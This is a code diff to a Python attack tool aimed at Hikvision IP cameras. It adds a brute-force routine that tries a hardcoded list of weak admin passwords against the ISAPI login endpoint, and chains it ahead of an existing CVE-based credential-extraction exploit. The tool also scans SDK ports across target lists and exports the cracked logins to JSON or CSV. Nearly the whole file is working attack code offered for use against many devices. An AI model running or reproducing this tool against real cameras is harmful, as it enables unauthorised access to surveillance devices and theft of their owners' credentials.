@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+# Maptnh@S-H4CK13
 import json
 import argparse
 import re
@@ -8,18 +8,37 @@ import sys
 import socket
 import threading
 import queue
+import time
 from itertools import cycle
 from concurrent.futures import ThreadPoolExecutor, as_completed, CancelledError
- 
+import xml.etree.ElementTree as ET
+
 from Crypto.Cipher import AES
 import requests
 from requests.exceptions import RequestException, ConnectionError, Timeout
 from requests.auth import HTTPBasicAuth
-
- 
+ERROR = "\033[31m"
+SUCCESS = "\033[32m"
+INFO = "\033[34m"
+RESET = "\033[0m"
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
- 
+LOGO = '''
+⠀⠀⠀⣸⣏⠛⠻⠿⣿⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
+⠀⠀⠀⣿⣿⣿⣷⣦⣤⣈⠙⠛⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⣈⠙⠻⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡉⠛⠻⢿⣿⣷⣶⣤⣀⠀⠀
+⠀⠀⠀⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⢻⣍⡉⠉⣿⠇⠀
+⠀⠀⠀⠀⠀⠀⠀⢹⡏⢹⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣰⣿⣿⣾⠏⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠘⣿⠈⣿⠸⣯⠉⠛⠿⢿⣿⣿⣿⣿⡏⠀⠻⠿⣿⠇⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⢻⡄⣿⡀⠀⠀⠀⠈⠙⠛⠿⠿⠿⠿⠛⠋⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⣇⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣀⣀⣿⣴⣿⢾⣿⠀⠀⠀⠀⠀⠀Hikvision⠀⠀⠀⠀⠀⠀
+⠀⠀⣴⡶⠾⠟⠛⠋⢹⡏⠀⢹⡇⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢠⣿⠀⠀⠀⠀⢀⣈⣿⣶⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
+⠀⢸⣿⣴⠶⠞⠛⠉⠁⠀<Web Password Enumeration | CVE Exploitation | SDK Brute-Forcing>
+⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀'''
+
 HEX_DATA = "0000002063000000119706d5001110c26800a8c025801157cc28aa16edda0000"
 MATCH_PREFIX = "000000c4"
 DEFAULT_SDK_PORT = 8000
@@ -59,6 +78,88 @@ class HikvisionCracker:
         self.open_sdk_ports = {}
         self.final_results = []
 
+    def crack_web_password(self, ip: str, port: str):
+        usr = 'admin'
+        pass0d_top7 = [
+            "Admin123456",
+            "12345abc",
+            "asdf1234",
+            "JaNek123",
+            "12345",
+            "123456",
+            "a12345678"
+        ] 
+        def parse_user_check_xml(xml_content: str):
+            try:
+                root = ET.fromstring(xml_content)
+                result = {
+                    "statusValue": root.findtext("statusValue") or "",
+                    "statusString": root.findtext("statusString") or "",
+                    "lockStatus": root.findtext("lockStatus") or "",
+                    "unlockTime": root.findtext("unlockTime") or "",
+                    "retryLoginTime": root.findtext("retryLoginTime") or ""
+                }
+                return result
+            except ET.ParseError as e:
+                return None
+        def extract_proto(ip,port):
+            protocols = ["http", "https"]
+            for protocol in protocols:
+                try:
+                    test_url = f"{protocol}://{ip}:{port}/"
+                    response = requests.get(
+                        test_url,
+                        timeout=10,
+                        verify=False
+                    )
+                    if response.status_code == 200:
+                        return protocol
+                except Exception as e:
+                    pass
+            print(f"{ERROR}[!] [WEB] Failed to find the Hikvision management page....{RESET}")
+            return None
+        proto = extract_proto(ip,port)
+        if proto:
+            for p in pass0d_top7:
+                try:
+                    timestamp = str(int(time.time()))
+                    base_url = f"{proto}://{ip}:{port}/ISAPI/Security/userCheck"
+                    url_ = f"{proto}://{ip}:{port}"
+                    params = {"timeStamp": timestamp}
+                    response = requests.get(
+                        url=base_url,
+                        params=params,
+                        auth=(usr, p),
+                        timeout=10,
+                        verify=False
+                    ) 
+                    parsed_result = parse_user_check_xml(response.text)
+                    if not parsed_result:
+                        print(f"{ERROR}[!] [WEB] [{url_}] The target response content is invalid....{RESET}")
+                        break
+                
+                    if response.status_code == 200 and parsed_result["statusValue"] == "200":
+                        print(f"{SUCCESS}[+] [WEB] [{url_}] Credentials found [{usr}:{p}]{RESET}")
+                        return {
+                                    "ip": ip,
+                                    "http_port": port,
+                                    "username": usr,
+                                    "password": p
+                                }
+                                
+                    elif response.status_code == 401:
+                        if parsed_result["lockStatus"] == "lock":
+                            print(f"{ERROR}[X] [WEB] [{url_}] Account locked, password cracking cancelled{RESET}")
+                            break
+                        elif parsed_result["lockStatus"] == "unlock":
+                            print(f"{INFO}[*] [WEB] [{url_}] Attempting to crack credentials...{RESET}")
+            
+                except requests.exceptions.RequestException as e:
+                    return False
+        
+                except requests.exceptions.RequestException as e:
+                    return False
+
     def validate_ip(self, ip: str) -> bool:
         """Validate if IP format is valid"""
         pattern = re.compile(r'^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
@@ -73,7 +174,7 @@ class HikvisionCracker:
             payload = bytes.fromhex(HEX_DATA)
         except ValueError as e:
             with self.print_lock:
-                print(f"[!] {ip}:{port} Hex data conversion failed: {str(e)[:30]}")
+                print(f"{ERROR}[!] [SDK] [{ip}:{port}] Hex data conversion failed: {str(e)[:30]}{RESET}")
             return None
 
         try:
@@ -87,24 +188,24 @@ class HikvisionCracker:
                     with self.result_lock:
                         self.open_sdk_ports[ip] = port
                     with self.print_lock:
-                        print(f"[SDK Crack Success] {ip}:{port}")
+                        print(f"{SUCCESS}[+] [SDK] [{ip}:{port}]{RESET}")
                     return port
         except (socket.timeout, ConnectionRefusedError, OSError, ConnectionError):
             pass
         except Exception as e:
             with self.print_lock:
-                print(f"[!] {ip}:{port} Scan exception: {str(e)[:30]}")
+                print(f"{ERROR}[!] [SDK] [{ip}:{port}] Scan exception: {str(e)[:30]}{RESET}")
         return None
 
     def batch_brute_sdk_ports(self, ip_list: list, max_workers: int) -> None:
         """Batch brute-force SDK ports for cracked IPs"""
         with self.print_lock:
-            print(f"[*] Start scanning SDK ports (Range: {SDK_PORT_SCAN_RANGE.start}-{SDK_PORT_SCAN_RANGE.stop-1})...")
+            print(f"{INFO}[*] Start scanning SDK ports (Range: {SDK_PORT_SCAN_RANGE.start}-{SDK_PORT_SCAN_RANGE.stop-1})...{RESET}")
  
         for ip in ip_list:
             if not self.validate_ip(ip):
                 with self.print_lock:
-                    print(f"[!] Invalid IP format: {ip}, skipped")
+                    print(f"{ERROR}[!] [SDK] Invalid IP format: {ip}, skipped{RESET}")
                 continue
             
             ip_has_open_port = False  
@@ -135,11 +236,11 @@ class HikvisionCracker:
                         pass
                     except Exception as e:
                         with self.print_lock:
-                            print(f"[!] {ip}:{port} Scan exception: {str(e)[:30]}")
+                            print(f"{ERROR}[!] [SDK] [{ip}:{port}] Scan exception: {str(e)[:30]}{RESET}")
             
             if not ip_has_open_port:
                 with self.print_lock:
-                    print(f"[!] {ip} No open SDK ports found (Range 8000-8099)")
+                    print(f"{ERROR}[!] [SDK] {ip} No open SDK ports found (Range 8000-8099){RESET}")
 
     def add_to_16(self, s: bytes) -> bytes:
         """AES decryption padding: make up to 16 bytes"""
@@ -157,7 +258,7 @@ class HikvisionCracker:
             return plaintext.rstrip(b"\0")
         except Exception as e:
             with self.print_lock:
-                print(f"[!] AES decryption failed: {str(e)[:30]}")
+                print(f"{ERROR}[!] AES decryption failed: {str(e)[:30]}{RESET}")
             return b""
 
     def xore(self, data: bytes) -> bytes:
@@ -191,13 +292,13 @@ class HikvisionCracker:
             return response
         except Timeout:
             with self.print_lock:
-                print(f"[!] {ip}:{port} Request timeout (> {REQUEST_TIMEOUT} seconds)")
+                print(f"{ERROR}[!] [{ip}:{port}] Request timeout (> {REQUEST_TIMEOUT} seconds){RESET}")
         except ConnectionError:
             with self.print_lock:
-                print(f"[!] {ip}:{port} Connection failed")
+                print(f"{ERROR}[!] [{ip}:{port}] Connection failed{RESET}")
         except RequestException as e:
             with self.print_lock:
-                print(f"[!] {ip}:{port} Request failed: {str(e)[:50]}")
+                print(f"{ERROR}[!] [{ip}:{port}] Request failed: {str(e)[:50]}{RESET}")
         return None
 
     def find_last_list_index(self, lst: list, target: str) -> int:
@@ -236,7 +337,7 @@ class HikvisionCracker:
                     password = data_list[admin_index+1].strip() or "default123456"
                     
                     with self.print_lock:
-                        print(f"[+] Crack success {ip}:{http_port} => {username}:{password}")
+                        print(f"{SUCCESS}[+] [CVE] [{ip}:{http_port}] Credentials found [{username}:{password}]{RESET}")
                     
                     return {
                         "ip": ip,
@@ -246,25 +347,25 @@ class HikvisionCracker:
                     }
                 else:
                     with self.print_lock:
-                        print(f"[!] {ip}:{http_port} Admin password not found")
+                        print(f"{ERROR}[!] [CVE] [{ip}:{http_port}] Admin password not found{RESET}")
             except Exception as e:
                 with self.print_lock:
-                    print(f"[!] {ip}:{http_port} Cracking exception: {str(e)[:50]}")
+                    print(f"{ERROR}[!] [CVE] [{ip}:{http_port}] Cracking exception: {str(e)[:50]}{RESET}")
         else:
             with self.print_lock:
-                print(f"[!] {ip}:{http_port} Status code {response.status_code}, skipped")
+                print(f"{ERROR}[!] [CVE] [{ip}:{http_port}] Status code {response.status_code}, skipped{RESET}")
         return None
 
     def read_ips_from_file(self, file_path: str) -> list:
         """Read IP list from file (supports ip or ip:port format)"""
         if not os.path.exists(file_path):
             with self.print_lock:
-                print(f"[!] Target file does not exist: {file_path}")
+                print(f"{ERROR}[!] Target file does not exist: {file_path}{RESET}")
             return []
         
         if not os.access(file_path, os.R_OK):
             with self.print_lock:
-                print(f"[!] No read permission: {file_path}")
+                print(f"{ERROR}[!] No read permission: {file_path}{RESET}")
             return []
         
         ip_list = []
@@ -282,7 +383,7 @@ class HikvisionCracker:
                         
                         if not self.validate_ip(ip):
                             with self.print_lock:
-                                print(f"[!] Line {line_num}: Invalid IP format {ip}, skipped")
+                                print(f"{ERROR}[!] Line {line_num}: Invalid IP format {ip}, skipped{RESET}")
                             continue
                         
                         if port_str.isdigit():
@@ -291,11 +392,11 @@ class HikvisionCracker:
                                 ip_list.append({"ip": ip, "port": port})
                             else:
                                 with self.print_lock:
-                                    print(f"[!] Line {line_num}: Port {port_str} out of range, using default 80 for {ip}")
+                                    print(f"{ERROR}[!] Line {line_num}: Port {port_str} out of range, using default 80 for {ip}{RESET}")
                                     ip_list.append({"ip": ip, "port": DEFAULT_HTTP_PORT})
                         else:
                             with self.print_lock:
-                                print(f"[!] Line {line_num}: Port {port_str} is not a number, using default 80 for {ip}")
+                                print(f"{ERROR}[!] Line {line_num}: Port {port_str} is not a number, using default 80 for {ip}{RESET}")
                                 ip_list.append({"ip": ip, "port": DEFAULT_HTTP_PORT})
                     else:
                         ip = line.strip()
@@ -309,11 +410,11 @@ class HikvisionCracker:
             ip_list = list(unique_ips.values())
             
             with self.print_lock:
-                print(f"[*] Successfully read {len(ip_list)} valid targets")
+                print(f"{INFO}[*] Successfully read {len(ip_list)} valid targets{RESET}")
             return ip_list
         except Exception as e:
             with self.print_lock:
-                print(f"[!] Failed to read file: {str(e)[:50]}")
+                print(f"{ERROR}[!] Failed to read file: {str(e)[:50]}{RESET}")
         return []
 
     def parse_manual_ips(self, ip_str_list: list) -> list:
@@ -331,7 +432,7 @@ class HikvisionCracker:
                 
                 if not self.validate_ip(ip):
                     with self.print_lock:
-                        print(f"[!] Invalid IP format: {ip}, skipped")
+                        print(f"{ERROR}[!] Invalid IP format: {ip}, skipped{RESET}")
                     continue
                 
                 if port_str.isdigit():
@@ -340,11 +441,11 @@ class HikvisionCracker:
                         ip_list.append({"ip": ip, "port": port})
                     else:
                         with self.print_lock:
-                            print(f"[!] Port {port_str} out of range, using default 80 for {ip}")
+                            print(f"{ERROR}[!] Port {port_str} out of range, using default 80 for {ip}{RESET}")
                             ip_list.append({"ip": ip, "port": DEFAULT_HTTP_PORT})
                 else:
                     with self.print_lock:
-                        print(f"[!] Port {port_str} is not a number, using default 80 for {ip}")
+                        print(f"{ERROR}[!] Port {port_str} is not a number, using default 80 for {ip}{RESET}")
                         ip_list.append({"ip": ip, "port": DEFAULT_HTTP_PORT})
             else:
                 ip = ip_str.strip()
@@ -352,7 +453,7 @@ class HikvisionCracker:
                     ip_list.append({"ip": ip, "port": DEFAULT_HTTP_PORT})
                 else:
                     with self.print_lock:
-                        print(f"[!] Invalid IP format: {ip}, skipped")
+                        print(f"{ERROR}[!] Invalid IP format: {ip}, skipped{RESET}")
         
         unique_ips = {}
         for item in ip_list:
@@ -361,7 +462,7 @@ class HikvisionCracker:
         ip_list = list(unique_ips.values())
         
         with self.print_lock:
-            print(f"[*] Successfully parsed {len(ip_list)} valid targets from manual input")
+            print(f"{INFO}[*] Successfully parsed {len(ip_list)} valid targets from manual input{RESET}")
         return ip_list
 
     def crack_worker(self, task_queue: queue.Queue):
@@ -386,8 +487,9 @@ class HikvisionCracker:
 
                 ip = target.get("ip")
                 http_port = int(target.get("port", DEFAULT_HTTP_PORT))
-
-                result = self.crack_password(ip, http_port)
+                result = self.crack_web_password(ip,http_port)
+                if not result:
+                    result = self.crack_password(ip, http_port)
                 if result and isinstance(result, dict):
                     with self.result_lock:
                         if not any(dev.get("ip") == ip for dev in self.cracked_devices):
@@ -395,7 +497,7 @@ class HikvisionCracker:
 
             except Exception as e:
                 with self.print_lock:
-                    print(f"[!] Worker thread exception: {str(e)[:200]}")
+                    print(f"{ERROR}[!] Worker thread exception: {str(e)[:200]}{RESET}")
             finally:
                 try:
                     task_queue.task_done()
@@ -454,7 +556,7 @@ class HikvisionCracker:
         if dir_path and not os.path.exists(dir_path):
             os.makedirs(dir_path, exist_ok=True)
             with self.print_lock:
-                print(f"[*] Created directory: {dir_path}")
+                print(f"{INFO}[*] Created directory: {dir_path}{RESET}")
         
         header_fields = self.csv_header.split(',')
         expected_fields_count = len(header_fields)
@@ -485,7 +587,7 @@ class HikvisionCracker:
             row_fields_count = len(row.strip().split(','))
             if row_fields_count != expected_fields_count:
                 with self.print_lock:
-                    print(f"[!] Skip invalid row {idx}: {csv_data['address']} (fields count {row_fields_count} != {expected_fields_count})")
+                    print(f"{ERROR}[!] Skip invalid row {idx}: {csv_data['address']} (fields count {row_fields_count} != {expected_fields_count}){RESET}")
                 continue
             
             csv_rows.append(row)
@@ -498,11 +600,11 @@ class HikvisionCracker:
             if os.path.exists(csv_path):
                 file_size = os.path.getsize(csv_path)
                 with self.print_lock:
-                    print(f"[*] Successfully exported {valid_rows} valid devices to CSV: {csv_path} (Size: {file_size} bytes)")
+                    print(f"{INFO}[*] Successfully exported {valid_rows} valid devices to CSV: {csv_path} (Size: {file_size} bytes){RESET}")
             return True
         except Exception as e:
             with self.print_lock:
-                print(f"[!] Failed to export CSV: {str(e)}")
+                print(f"{ERROR}[!] Failed to export CSV: {str(e)}{RESET}")
             return False
 
     def save_to_json(self, json_path: str) -> bool:
@@ -512,10 +614,10 @@ class HikvisionCracker:
             try:
                 os.makedirs(dir_path, exist_ok=True)
                 with self.print_lock:
-                    print(f"[*] Directory created successfully: {dir_path}")
+                    print(f"{INFO}[*] Directory created successfully: {dir_path}{RESET}")
             except Exception as e:
                 with self.print_lock:
-                    print(f"[!] Failed to create directory: {str(e)[:30]}")
+                    print(f"{ERROR}[!] Failed to create directory: {str(e)[:30]}{RESET}")
                 return False
         
         json_output = []
@@ -530,15 +632,15 @@ class HikvisionCracker:
             if os.path.exists(json_path):
                 file_size = os.path.getsize(json_path)
                 with self.print_lock:
-                    print(f"[*] JSON exported successfully: {json_path} (Size: {file_size} bytes, Number of devices: {len(json_output)})")
+                    print(f"{INFO}[*] JSON exported successfully: {json_path} (Size: {file_size} bytes, Number of devices: {len(json_output)}){RESET}")
             return True
         except PermissionError:
             with self.print_lock:
-                print(f"[!] No write permission: {json_path}")
+                print(f"{ERROR}[!] No write permission: {json_path}{RESET}")
             return False
         except Exception as e:
             with self.print_lock:
-                print(f"[!] Failed to export JSON: {str(e)[:50]}")
+                print(f"{ERROR}[!] Failed to export JSON: {str(e)[:50]}{RESET}")
             return False
 
 
@@ -550,6 +652,7 @@ class Exploit:
         output_type="json",
         output_path="./result.json"
     ):
+        print(LOGO)
         cracker = HikvisionCracker()
         ip_list = []
         if isinstance(ips, str) and os.path.isfile(ips):
@@ -576,14 +679,14 @@ class Exploit:
                         else:
                             ip_list.append({"ip": it.strip(), "port": DEFAULT_HTTP_PORT})
         else:
-            print("[!] Invalid target type")
+            print(f"{ERROR}[!] Invalid target type{RESET}")
             return
 
         if not ip_list:
-            print("[!] No valid targets")
+            print(f"{ERROR}[!] No valid targets{RESET}")
             return
 
-        print(f"[*] Start cracking ({len(ip_list)} targets, threads={threads})")
+        print(f"{INFO}[*] Start cracking ({len(ip_list)} targets, threads={threads}){RESET}")
 
         task_queue = queue.Queue()
         for item in ip_list:
@@ -603,7 +706,7 @@ class Exploit:
         task_queue.join()
 
         if not cracker.cracked_devices:
-            print("[!] No devices cracked successfully")
+            print(f"{ERROR}[!] No devices cracked successfully{RESET}")
             return
 
         cracked_ip_list = [d["ip"] for d in cracker.cracked_devices if isinstance(d, dict) and "ip" in d]
@@ -612,7 +715,7 @@ class Exploit:
         cracker.assemble_final_results()
 
         if not cracker.final_results:
-            print("[!] No final results to export")
+            print(f"{ERROR}[!] No final results to export{RESET}")
             return
 
         if output_type == "csv":
@@ -620,4 +723,4 @@ class Exploit:
         else:
             cracker.save_to_json(output_path)
 
-        print(f"[*] Done! Exported {len(cracker.final_results)} devices in total")
+        print(f"{INFO}[*] Done! Exported {len(cracker.final_results)} devices in total{RESET}")
